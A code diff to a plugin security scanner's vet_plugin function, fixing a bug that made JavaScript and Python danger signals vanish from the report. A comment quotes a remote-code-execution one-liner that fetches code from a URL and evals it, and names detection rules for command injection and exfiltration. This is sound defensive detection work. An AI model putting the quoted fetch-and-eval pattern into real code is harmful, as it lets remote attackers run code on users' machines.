@@ -943,6 +943,7 @@ def vet_plugin(
     finding.bundled_contexts = bundled_contexts
     finding.unanalysed_code = unanalysed_code
     finding.analysed_loose_code = analysed_loose_code
+    axis_reasons: dict[str, list] = {}
     if warns:
         # Container-native signals (manifest sanity, npm lifecycle scripts, floating
         # dependency versions, skills-entry path escape, native-executable stowaways)
@@ -952,7 +953,33 @@ def vet_plugin(
         # way vet_mcp() tags MCP-VET via axis_reasons; each item is always WARN-severity
         # (rank 2) regardless of whether a dispatched sub-finding pushed the overall
         # status further to FAIL.
-        finding.axis_reasons = {"build": [[WARN, w] for w in warns]}
+        axis_reasons["build"] = [[WARN, w] for w in warns]
+    if js_signals or py_signals:
+        # B-742: B-149 is the comment directly above, and it names the exact hazard —
+        # a container-native signal that rides on no sub-finding is dropped from the
+        # dossier unless it is tagged here. B-165 then added `js_signals` and B-636
+        # added `py_signals` to the WARN floor of `rank` and did NOT tag either, so both
+        # reopened the defect B-149 closed, for two new families.
+        #
+        # What that produced, measured: a plugin whose `index.js` is
+        # `fetch(url).then(r=>r.text()).then(eval)` — JS_EVAL_REMOTE, severity `crit` —
+        # returned PLUGIN-VET status=WARN from this function and rendered
+        # `INSTALL / Danger PASS "no malware signature or known-bad indicator" / exit 0`.
+        # The engine saw it, said WARN, and the dossier threw the verdict away, because
+        # `dossier.py`'s PLUGIN-VET arm routes ONLY `.axis_reasons` and passes
+        # `fallback_axis=None` — an empty mapping there means "the container found
+        # nothing", which was false whenever these two lists were non-empty.
+        #
+        # Danger, not build: every rule in both families is about what the code DOES —
+        # obfuscated/remote RCE, command injection, an attacker-influenced require path,
+        # a dlopen escape past the analysis, and (Python side) the WARN-only exec/exfil
+        # rules. B-636's own comment says it: Danger is the axis a pre-install gate is
+        # consulted for. WARN-severity entries, never FAIL, keeping B-165's rule that a
+        # lexical false positive on a minified bundle must not force a FAIL — the
+        # fail-capable Python findings already ride in `subs` and bucket on their own.
+        axis_reasons["danger"] = [[WARN, s] for s in (*js_signals, *py_signals)]
+    if axis_reasons:
+        finding.axis_reasons = axis_reasons
     return finding
 
 
